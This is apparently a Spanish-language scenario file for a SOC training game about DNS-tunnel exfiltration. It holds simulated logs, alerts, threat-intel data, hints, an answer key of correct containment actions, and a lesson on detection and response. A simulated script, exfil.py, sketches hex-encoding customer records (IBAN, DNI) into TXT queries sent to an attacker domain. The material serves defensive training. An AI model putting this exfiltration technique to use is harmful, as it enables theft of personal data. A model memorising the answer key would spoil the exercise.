import { dnsLogTunel } from "./helpers.js";

export default {
  id: "dns-exfil-01",
  titulo: "«Consultas DNS interminables» — Exfiltración por túnel DNS",
  severidad: "ALTA",
  nivel: 4,
  sla: 960, // 16 minutos
  xp: 450,
  briefing:
    "El equipo de red ha detectado un volumen descomunal de consultas DNS hacia un dominio " +
    "desconocido, con subdominios hexadecimales de 24 caracteres. Esto es el patrón clásico " +
    "de túnel DNS: exfiltrar datos escondiéndolos en consultas DNS que nadie vigila.\n\n" +
    "Eres analista senior: determina el alcance, identifica la cuenta y el equipo implicados " +
    "y coordina la respuesta. La víctima puede estar perdiendo datos ahora mismo.",

  fs: {
    "/var/log/dns.log": [
      "Feb 14 02:00:12 dns01 queries: client 10.1.3.42#53000: query: check.exfil.sync-cloud.xyz IN A",
      ...dnsLogTunel("exfil.sync-cloud.xyz", 40).split("\n"),
      "Feb 14 02:05:31 dns01 queries: client 10.1.3.42#53000: query: 7f3a91c8b2d4e6f0a1c3d5e7f9b2a4c6d8e0f1a2b3c4d5e6f7.exfil.sync-cloud.xyz IN TXT",
      "Feb 14 02:06:00 dns01 queries: client 10.1.3.42#53000: query: exfil.sync-cloud.xyz IN A",
    ].join("\n"),

    "/var/log/proxy.log": [
      "Feb 14 02:01:05 squid[1044]: 10.1.3.42 - CONNECT api.sync-cloud.xyz:443 - TCP_TUNNEL/200",
      "Feb 14 02:01:08 squid[1044]: 10.1.3.42 - GET http://exfil.sync-cloud.xyz/ - TCP_MISS/200 text/html",
      "Feb 14 02:03:44 squid[1044]: 10.1.3.42 - GET http://exfil.sync-cloud.xyz/upload - TCP_MISS/200 application/octet-stream",
    ].join("\n"),

    "/opt/siem/alerts.json": JSON.stringify(
      [
        {
          id: "ALT-701",
          sev: "HIGH",
          fuente: "dns",
          ts: "2026-02-14T02:04:00Z",
          titulo: "Posible túnel DNS: picos de consultas TXT a dominio desconocido",
          detalle:
            "Miles de consultas TXT con subdominios hexadecimales largos hacia exfil.sync-cloud.xyz desde 10.1.3.42 (srv-api-03).",
          estado: "ABIERTA",
        },
        {
          id: "ALT-702",
          sev: "MEDIUM",
          fuente: "proxy",
          ts: "2026-02-14T02:03:50Z",
          titulo: "Subida de datos a dominio de registro reciente",
          detalle: "La cuenta de servicio api-sync sube datos a exfil.sync-cloud.xyz/upload.",
          estado: "ABIERTA",
        },
        {
          id: "ALT-703",
          sev: "HIGH",
          fuente: "siem",
          ts: "2026-02-14T02:05:00Z",
          titulo: "Patrón de exfiltración: salida de datos fuera de horario",
          detalle: "srv-api-03 transfiere datos de la BD de clientes (tabla clients) fuera de la ventana de mantenimiento.",
          estado: "ABIERTA",
        },
      ],
      null,
      2
    ),

    "/var/log/audit/audit.log": [
      "type=USER_CMD msg=audit(2026-02-14T01:59:58): pid=3310 auid=2005 ses=501 user='api-sync' cmd='python3 /opt/api-sync/exfil.py'",
      "type=USER_CMD msg=audit(2026-02-14T01:59:59): pid=3311 auid=2005 ses=501 user='api-sync' cmd='/usr/bin/nslookup check.exfil.sync-cloud.xyz'",
      "type=USER_CMD msg=audit(2026-02-14T02:00:12): pid=3311 auid=2005 ses=501 user='api-sync' cmd='/usr/bin/python3 -c \"import socket;...\" '",
    ].join("\n"),

    "/opt/api-sync/exfil.py": [
      "#!/usr/bin/env python3",
      "# Script sospechoso encontrado en srv-api-03",
      "import base64, dns.resolver",
      "",
      "def exfiltrar(datos):",
      "    # Codifica los datos en subdominios hexadecimales y los manda como TXT",
      "    for chunk in chunks(datos):",
      "        sub = chunk.hex() + '.exfil.sync-cloud.xyz'",
      "        dns.resolver.resolve(sub, 'TXT')",
      "",
      "if __name__ == '__main__':",
      "    # Lee la tabla de clientes (nombre, IBAN, DNI) y la exfiltra",
      "    datos = db.query('SELECT nombre, iban, dni FROM clients')",
      "    exfiltrar(datos)",
    ].join("\n"),

    "/home/analista/casos/evidencias/README.txt":
      "Caso #CASE-4502 — posible exfiltración DNS.\n" +
      "Fuentes: /var/log/dns.log, /var/log/proxy.log, /var/log/audit/audit.log, /opt/api-sync/exfil.py",
  },

  correos: [],
  alertas: [
    { id: "ALT-701", sev: "HIGH", fuente: "dns", titulo: "Posible túnel DNS: picos de consultas TXT a dominio desconocido" },
    { id: "ALT-702", sev: "MEDIUM", fuente: "proxy", titulo: "Subida de datos a dominio de registro reciente" },
    { id: "ALT-703", sev: "HIGH", fuente: "siem", titulo: "Patrón de exfiltración: salida de datos fuera de horario" },
  ],

  dominios: {
    "exfil.sync-cloud.xyz": {
      ip: "185.220.102.9",
      registrado: "Hace 3 días (11 Feb 2026)",
      registrador: "Njalla (anonimizador)",
      whois: [
        "Domain: exfil.sync-cloud.xyz",
        "Registered: 2026-02-11 (hace 3 DÍAS)",
        "Registrar: Njalla — registro anónimo",
        "Name Server: ns1.rogue-dns.net",
        "IP: 185.220.102.9",
        "Nota: dominio de registro reciente con servidores DNS propios: infraestructura típica de túnel DNS.",
      ].join("\n"),
      vt: { repos: 8, maliciosos: 7, deteccion: "MALICIOSO (7/8)", comentarios: "Dominio de exfiltración (túnel DNS)." },
    },
  },

  ips: {
    "185.220.102.9": {
      pais: "🇩🇪 Alemania (anonimizador)",
      asn: "AS44477",
      reputacion: "MALICIOSA — asociada a infraestructura de exfiltración.",
    },
  },

  urls: {
    "http://exfil.sync-cloud.xyz/upload":
      "HTTP/1.1 200 OK — endpoint de recepción de datos. El tráfico real viaja en las consultas DNS TXT.",
  },

  correctas: {
    bloquear: ["dominio:exfil.sync-cloud.xyz", "ip:185.220.102.9"],
    aislar: ["host:srv-api-03"],
    deshabilitar: ["usuario:api-sync"],
    escalar: true,
    cerrar: false,
  },

  incorrectas: [
    "bloquear|ip:10.1.3.42",
    "deshabilitar|usuario:svc_backup",
  ],

  eventos: [
    {
      en: 240,
      tipo: "alerta",
      sev: "CRITICAL",
      titulo: "Aceleración de la exfiltración",
      detalle: "El volumen de consultas TXT se ha triplicado. Se están exfiltrando más tablas (tabla employees).",
    },
    {
      en: 540,
      tipo: "msg",
      titulo: "Datos afectados",
      detalle: "Confirmado desde cumplimiento: la tabla clients contiene IBAN y DNI de 42.000 clientes. Notificación RGPD será obligatoria si no se corta a tiempo.",
    },
  ],

  pistas: [
    "El patrón es claro en el dns.log: subdominios de 24+ caracteres hexadecimales en consultas TXT = túnel DNS.",
    "¿Quién lo ejecuta? Mira audit.log y el script en /opt/api-sync/.",
    "Bloquea el dominio y la IP, aísla el servidor y deshabilita la cuenta.",
    "En el informe, incluye el alcance: qué datos, cuántos registros y el tiempo de fuga.",
  ],

  leccion: {
    titulo: "Túnel DNS: exfiltrar datos bajo el radar",
    mitre: ["T1048.003", "T1071.004", "T1005", "T1041"],
    resumen:
      "El atacante (o un insider con la cuenta api-sync) codificó datos de la base de clientes en " +
      "subdominios hexadecimales y los envió como consultas DNS TXT a un dominio controlado por él. " +
      "El DNS casi nunca se filtra ni se monitoriza, por eso es el canal favorito de exfiltración.",
    deteccion:
      "- Subdominios largos (> 24 caracteres) con alta entropía (hexadecimal/alfanumérico aleatorio).\n" +
      "- Consultas TXT masivas a un único dominio desde un solo host.\n" +
      "- Volumen DNS anormal: miles de consultas por hora donde antes había decenas.\n" +
      "- Dominio de registro reciente con servidores DNS propios.\n" +
      "- Coincidencia temporal con descargas/subidas en el proxy.",
    respuesta:
      "1. Bloquear el dominio y la IP en el resolutor/firewall (corta el canal YA).\n" +
      "2. Aislar el host afectado y deshabilitar la cuenta de servicio.\n" +
      "3. Conservar los logs DNS: son la evidencia del alcance (qué datos y cuánto).\n" +
      "4. Determinar el alcance: tablas accedidas, registros, ventana temporal.\n" +
      "5. Escalar a CSIRT + cumplimiento: puede haber obligación de notificar (RGPD, 72 h).",
    aprendizaje: [
      "El DNS es un canal de exfiltración silencioso: monitorízalo (entropía, volumen, dominios nuevos).",
      "Las cuentas de servicio con acceso a BD son objetivo: minimiza permisos y audita su uso.",
      "La alta entropía en subdominios es una señal de detección barata y muy efectiva.",
      "Un insider o una cuenta comprometida deja los mismos patrones: no asumas quién es el atacante.",
      "Los logs DNS valen oro en la investigación: conserva y centraliza.",
    ],
    glosario: ["Túnel DNS", "Exfiltración", "Entropía", "Cuenta de servicio", "RGPD", "TXT record"],
  },
};
